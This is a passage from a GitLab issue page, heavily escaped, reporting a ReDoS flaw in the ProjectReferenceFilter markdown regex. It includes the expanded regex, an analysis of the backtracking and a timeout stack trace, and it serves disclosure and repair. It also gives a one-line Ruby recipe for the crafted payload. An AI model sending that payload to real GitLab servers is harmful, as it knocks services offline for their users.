class=\&quot;k\&quot;\u003edo\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e|\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003econtent\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e|\u003c/span\u003e  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;169:1-170:128\&quot; dir=\&quot;auto\&quot;\u003eThis \u003ccode data-sourcepos=\&quot;169:7-169:10\&quot;\u003ecall\u003c/code\u003e method gets the regex pattern by calling \u003ccode data-sourcepos=\&quot;169:55-169:83\&quot;\u003eself.object_reference_pattern\u003c/code\u003e.\u003cbr data-sourcepos=\&quot;169:88-169:88\&quot;\u003e\u0026#x000A;When I added the debug code below and tested it, I found that \u003ccode data-sourcepos=\&quot;170:64-170:73\&quot;\u003eself.class\u003c/code\u003e just before the timeout was \u003ccode data-sourcepos=\&quot;170:105-170:126\&quot;\u003eProjectReferenceFilter\u003c/code\u003e.\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;172:1-181:3\&quot; data-canonical-lang=\&quot;diff\&quot; class=\&quot;code highlight js-syntax-highlight language-diff\&quot; lang=\&quot;diff\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;diff\&quot;\u003e        def call  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;diff\&quot;\u003e          ref_pattern_start = /\\A#{object_reference_pattern}\\z/  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;diff\&quot;\u003e\u003cspan class=\&quot;gi\&quot;\u003e+\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;diff\&quot;\u003e\u003cspan class=\&quot;gi\&quot;\u003e+         puts self.class.inspect       #=\u0026gt; Banzai::Filter::References::ProjectReferenceFilter\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;diff\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;diff\&quot;\u003e          nodes.each_with_index do |node, index|  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;diff\&quot;\u003e            if text_node?(node)  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;diff\&quot;\u003e              replace_text_when_pattern_matches(node, index, object_reference_pattern) do |content|  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;183:1-183:83\&quot; dir=\&quot;auto\&quot;\u003eLet&#39;s look at the definitions of \u003ccode data-sourcepos=\&quot;183:35-183:81\&quot;\u003eProjectReferenceFilter.object_reference_pattern\u003c/code\u003e.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;185:1-185:121\&quot; dir=\&quot;auto\&quot;\u003e\u003ca href=\&quot;https://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/lib/banzai/filter/references/project_reference_filter.rb#L30-32\&quot;\u003ehttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/lib/banzai/filter/references/project_reference_filter.rb#L30-32\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;186:1-190:3\&quot; data-canonical-lang=\&quot;ruby\&quot; class=\&quot;code highlight js-syntax-highlight language-ruby\&quot; lang=\&quot;ruby\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e        \u003cspan class=\&quot;k\&quot;\u003edef\u003c/span\u003e \u003cspan class=\&quot;nf\&quot;\u003eobject_reference_pattern\u003c/span\u003e  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e          \u003cspan class=\&quot;p\&quot;\u003e[\u003c/span\u003e\u003cspan class=\&quot;err\&quot;\u003e@\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e]\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eobject_reference_pattern\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e||=\u003c/span\u003e \u003cspan class=\&quot;no\&quot;\u003eProject\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003emarkdown_reference_pattern\u003c/span\u003e  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e        \u003cspan class=\&quot;k\&quot;\u003eend\u003c/span\u003e  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;192:1-193:70\&quot; dir=\&quot;auto\&quot;\u003eIt looks like we will reach the goal soon.\u003cbr data-sourcepos=\&quot;192:45-192:45\&quot;\u003e\u0026#x000A;Let&#39;s look at the definitions of \u003ccode data-sourcepos=\&quot;193:35-193:68\&quot;\u003eProject.markdown_reference_pattern\u003c/code\u003e.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;195:1-195:88\&quot; dir=\&quot;auto\&quot;\u003e\u003ca href=\&quot;https://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/app/models/project.rb#L915-921\&quot;\u003ehttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/app/models/project.rb#L915-921\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;196:1-204:3\&quot; data-canonical-lang=\&quot;ruby\&quot; class=\&quot;code highlight js-syntax-highlight language-ruby\&quot; lang=\&quot;ruby\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e    \u003cspan class=\&quot;k\&quot;\u003edef\u003c/span\u003e \u003cspan class=\&quot;nf\&quot;\u003emarkdown_reference_pattern\u003c/span\u003e  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e      \u003cspan class=\&quot;p\&quot;\u003e[\u003c/span\u003e\u003cspan class=\&quot;err\&quot;\u003e@\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e]\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003emarkdown_reference_pattern\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e||=\u003c/span\u003e  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e        \u003cspan class=\&quot;sr\&quot;\u003e%r{  \u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e\u003cspan class=\&quot;sr\&quot;\u003e          \u003c/span\u003e\u003cspan class=\&quot;si\&quot;\u003e#{\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003ereference_pattern\u003c/span\u003e\u003cspan class=\&quot;si\&quot;\u003e}\u003c/span\u003e\u003cspan class=\&quot;sr\&quot;\u003e  \u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e\u003cspan class=\&quot;sr\&quot;\u003e          (\u003c/span\u003e\u003cspan class=\&quot;si\&quot;\u003e#{\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003ereference_postfix\u003c/span\u003e\u003cspan class=\&quot;si\&quot;\u003e}\u003c/span\u003e\u003cspan class=\&quot;sr\&quot;\u003e|\u003c/span\u003e\u003cspan class=\&quot;si\&quot;\u003e#{\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003ereference_postfix_escaped\u003c/span\u003e\u003cspan class=\&quot;si\&quot;\u003e}\u003c/span\u003e\u003cspan class=\&quot;sr\&quot;\u003e)  \u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e\u003cspan class=\&quot;sr\&quot;\u003e        }x\u003c/span\u003e  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e    \u003cspan class=\&quot;k\&quot;\u003eend\u003c/span\u003e  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;206:1-206:111\&quot; dir=\&quot;auto\&quot;\u003eLet&#39;s also look at the definitions of \u003ccode data-sourcepos=\&quot;206:40-206:56\&quot;\u003ereference_pattern\u003c/code\u003e, \u003ccode data-sourcepos=\&quot;206:61-206:77\&quot;\u003ereference_postfix\u003c/code\u003e and \u003ccode data-sourcepos=\&quot;206:85-206:109\&quot;\u003ereference_postfix_escaped\u003c/code\u003e.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;208:1-208:88\&quot; dir=\&quot;auto\&quot;\u003e\u003ca href=\&quot;https://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/app/models/project.rb#L896-910\&quot;\u003ehttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/app/models/project.rb#L896-910\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;209:1-225:3\&quot; data-canonical-lang=\&quot;ruby\&quot; class=\&quot;code highlight js-syntax-highlight language-ruby\&quot; lang=\&quot;ruby\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e    \u003cspan class=\&quot;k\&quot;\u003edef\u003c/span\u003e \u003cspan class=\&quot;nf\&quot;\u003ereference_pattern\u003c/span\u003e  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e      \u003cspan class=\&quot;sr\&quot;\u003e%r{  \u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e\u003cspan class=\&quot;sr\&quot;\u003e        (?\u0026lt;!\u003c/span\u003e\u003cspan class=\&quot;si\&quot;\u003e#{\u003c/span\u003e\u003cspan class=\&quot;no\&quot;\u003eGitlab\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e::\u003c/span\u003e\u003cspan class=\&quot;no\&quot;\u003ePathRegex\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e::\u003c/span\u003e\u003cspan class=\&quot;no\&quot;\u003ePATH_START_CHAR\u003c/span\u003e\u003cspan class=\&quot;si\&quot;\u003e}\u003c/span\u003e\u003cspan class=\&quot;sr\&quot;\u003e)  \u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e\u003cspan class=\&quot;sr\&quot;\u003e        ((?\u0026lt;namespace\u0026gt;\u003c/span\u003e\u003cspan class=\&quot;si\&quot;\u003e#{\u003c/span\u003e\u003cspan class=\&quot;no\&quot;\u003eGitlab\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e::\u003c/span\u003e\u003cspan class=\&quot;no\&quot;\u003ePathRegex\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e::\u003c/span\u003e\u003cspan class=\&quot;no\&quot;\u003eFULL_NAMESPACE_FORMAT_REGEX\u003c/span\u003e\u003cspan class=\&quot;si\&quot;\u003e}\u003c/span\u003e\u003cspan class=\&quot;sr\&quot;\u003e)/)?  \u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e\u003cspan class=\&quot;sr\&quot;\u003e        (?\u0026lt;project\u0026gt;\u003c/span\u003e\u003cspan class=\&quot;si\&quot;\u003e#{\u003c/span\u003e\u003cspan class=\&quot;no\&quot;\u003eGitlab\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e::\u003c/span\u003e\u003cspan class=\&quot;no\&quot;\u003ePathRegex\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e::\u003c/span\u003e\u003cspan class=\&quot;no\&quot;\u003ePROJECT_PATH_FORMAT_REGEX\u003c/span\u003e\u003cspan class=\&quot;si\&quot;\u003e}\u003c/span\u003e\u003cspan class=\&quot;sr\&quot;\u003e)  \u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e\u003cspan class=\&quot;sr\&quot;\u003e      }xo\u003c/span\u003e  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e    \u003cspan class=\&quot;k\&quot;\u003eend\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC9\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e    \u003cspan class=\&quot;k\&quot;\u003edef\u003c/span\u003e \u003cspan class=\&quot;nf\&quot;\u003ereference_postfix\u003c/span\u003e  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC10\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e      \u003cspan class=\&quot;s1\&quot;\u003e&#39;\u0026gt;&#39;\u003c/span\u003e  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC11\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e    \u003cspan class=\&quot;k\&quot;\u003eend\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC12\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC13\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e    \u003cspan class=\&quot;k\&quot;\u003edef\u003c/span\u003e \u003cspan class=\&quot;nf\&quot;\u003ereference_postfix_escaped\u003c/span\u003e  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC14\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e      \u003cspan class=\&quot;s1\&quot;\u003e&#39;\u0026amp;gt;&#39;\u003c/span\u003e  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC15\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e    \u003cspan class=\&quot;k\&quot;\u003eend\u003c/span\u003e  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;227:1-228:113\&quot; dir=\&quot;auto\&quot;\u003e\u003ccode data-sourcepos=\&quot;227:2-227:35\&quot;\u003eProject.markdown_reference_pattern\u003c/code\u003e method builds the final regex pattern by combining \u003ccode data-sourcepos=\&quot;227:90-227:106\&quot;\u003ereference_pattern\u003c/code\u003e, \u003ccode data-sourcepos=\&quot;227:111-227:127\&quot;\u003ereference_postfix\u003c/code\u003e and \u003ccode data-sourcepos=\&quot;227:135-227:159\&quot;\u003ereference_postfix_escaped\u003c/code\u003e.\u003cbr data-sourcepos=\&quot;227:164-227:164\&quot;\u003e\u0026#x000A;So, the regex pattern that is finally constructed by \u003ccode data-sourcepos=\&quot;228:55-228:88\&quot;\u003eProject.markdown_reference_pattern\u003c/code\u003e method is as follows:\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;229:1-238:3\&quot; data-canonical-lang=\&quot;ruby\&quot; class=\&quot;code highlight js-syntax-highlight language-ruby\&quot; lang=\&quot;ruby\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e\u003cspan class=\&quot;sr\&quot;\u003e/\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e\u003cspan class=\&quot;sr\&quot;\u003e          (?x-mi:  \u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e\u003cspan class=\&quot;sr\&quot;\u003e        (?\u0026lt;![a-zA-Z0-9_\\.])  \u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e\u003cspan class=\&quot;sr\&quot;\u003e        ((?\u0026lt;namespace\u0026gt;(?-mix:((?-mix:(?:[a-zA-Z0-9_\\.][a-zA-Z0-9_\\-\\.]*[a-zA-Z0-9_\\-]|[a-zA-Z0-9_])(?-mix:(?\u0026lt;!\\.git|\\.atom)))\\/){,20}(?-mix:(?:[a-zA-Z0-9_\\.][a-zA-Z0-9_\\-\\.]*[a-zA-Z0-9_\\-]|[a-zA-Z0-9_])(?-mix:(?\u0026lt;!\\.git|\\.atom)))))\\/)?  \u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e\u003cspan class=\&quot;sr\&quot;\u003e        (?\u0026lt;project\u0026gt;(?-mix:(?:[a-zA-Z0-9_\\.][a-zA-Z0-9_\\-\\.]*)(?-mix:(?\u0026lt;!\\.git|\\.atom))))  \u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e\u003cspan class=\&quot;sr\&quot;\u003e      )  \u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e\u003cspan class=\&quot;sr\&quot;\u003e          (\u0026gt;|\u0026amp;gt;)  \u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e\u003cspan class=\&quot;sr\&quot;\u003e        /x\u003c/span\u003e  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;240:1-242:149\&quot; dir=\&quot;auto\&quot;\u003eMatching this regex pattern with the payload contained in \u003ccode data-sourcepos=\&quot;240:60-240:100\&quot;\u003eProjectReferenceFilter_ReDoS_payload.json\u003c/code\u003e causes severe backtracking.\u003cbr data-sourcepos=\&quot;240:132-240:132\&quot;\u003e\u0026#x000A;The \u003ccode data-sourcepos=\&quot;241:6-241:13\&quot;\u003e(\u0026gt;|\u0026amp;gt;)\u003c/code\u003e at the end of this pattern is typical of the backtracking triggers.\u003cbr data-sourcepos=\&quot;241:85-241:85\&quot;\u003e\u0026#x000A;The regex engine keeps wandering around looking for character \u003ccode data-sourcepos=\&quot;242:64-242:64\&quot;\u003e\u0026gt;\u003c/code\u003e or string \u003ccode data-sourcepos=\&quot;242:78-242:81\&quot;\u003e\u0026amp;gt;\u003c/code\u003e that doesn&#39;t exist in \u003ccode data-sourcepos=\&quot;242:107-242:147\&quot;\u003eProjectReferenceFilter_ReDoS_payload.json\u003c/code\u003e.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;244:1-244:185\&quot; dir=\&quot;auto\&quot;\u003e\u003cem data-sourcepos=\&quot;244:1-244:185\&quot;\u003eNOTE: The crafted payload in \u003ccode data-sourcepos=\&quot;244:32-244:72\&quot;\u003eProjectReferenceFilter_ReDoS_payload.json\u003c/code\u003e can be easily generated with the Ruby code \u003ccode data-sourcepos=\&quot;244:119-244:182\&quot;\u003e\&quot;mailto:\&quot; + \&quot;a-\&quot; * 499_000 + \&quot;[@]aaaaaaaa..aaaaaaaa.example.com\&quot;\u003c/code\u003e.\u003c/em\u003e\u003c/p\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;246:1-246:44\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-what-is-the-expected-correct-behavior\&quot; class=\&quot;anchor\&quot; href=\&quot;#what-is-the-expected-correct-behavior\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eWhat is the expected correct behavior?\u003c/h4\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;248:1-250:138\&quot; dir=\&quot;auto\&quot;\u003eA typical technique for fixing the ReDoS is to rewrite the code without using regex matching.\u003cbr data-sourcepos=\&quot;248:96-248:96\&quot;\u003e\u0026#x000A;However, in this case, rewriting the code to not use regex matching could break consistency with other features.\u003cbr data-sourcepos=\&quot;249:115-249:115\&quot;\u003e\u0026#x000A;So, if we also care about consistency with other features, we need to rewrite the regex pattern \u003ccode data-sourcepos=\&quot;250:98-250:105\&quot;\u003e(\u0026gt;|\u0026amp;gt;)\u003c/code\u003e nicely to prevent backtracking.\u003c/p\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;252:1-252:40\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-relevant-logs-andor-screenshots\&quot; class=\&quot;anchor\&quot; href=\&quot;#relevant-logs-andor-screenshots\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eRelevant logs and/or screenshots\u003c/h4\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;253:1-254:90\&quot; dir=\&quot;auto\&quot;\u003eI put references to the screenshots at the appropriate places in this report.\u003cbr data-sourcepos=\&quot;253:80-253:80\&quot;\u003e\u0026#x000A;I also attach the stack trace when one request was forcefully stopped after 60+ seconds.\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;255:1-318:3\&quot; class=\&quot;code highlight js-syntax-highlight language-plaintext\&quot; lang=\&quot;plaintext\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRack::Timeout::RequestTimeoutException (Request ran for longer than 60000ms ):  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e    \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/filter/references/reference_filter.rb:209:in `replace_text_when_pattern_matches&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/filter/references/reference_filter.rb:50:in `block in call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/filter/references/reference_filter.rb:48:in `each&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/filter/references/reference_filter.rb:48:in `each_with_index&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/filter/references/reference_filter.rb:48:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/filter/references/reference_filter.rb:42:in `block in call_and_update_nodes&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC9\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/filter/references/reference_filter.rb:291:in `with_update_nodes&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC10\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/filter/references/reference_filter.rb:42:in `call_and_update_nodes&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC11\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/filter/references/reference_filter.rb:30:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC12\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/pipeline/base_pipeline.rb:23:in `block (2 levels) in singleton class&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC13\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/renderer.rb:130:in `render_result&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC14\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/renderer.rb:166:in `cacheless_render&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC15\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/renderer.rb:30:in `render&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC16\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/renderer.rb:120:in `block in cache_collection_render&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC17\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/renderer.rb:119:in `each&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC18\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/renderer.rb:119:in `cache_collection_render&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC19\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/reference_extractor.rb:33:in `html_documents&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC20\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/reference_extractor.rb:18:in `references&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC21\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/reference_extractor.rb:24:in `references&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC22\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/reference_extractor.rb:43:in `block (2 levels) in \u0026lt;class:ReferenceExtractor\u0026gt;&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC23\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eapp/services/preview_markdown_service.rb:33:in `find_user_references&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC24\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eapp/services/preview_markdown_service.rb:6:in `execute&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC25\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eapp/controllers/concerns/preview_markdown.rb:8:in `preview_markdown&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC26\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eee/lib/gitlab/ip_address_state.rb:10:in `with&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC27\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eee/app/controllers/ee/application_controller.rb:45:in `set_current_ip_address&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC28\&quot; 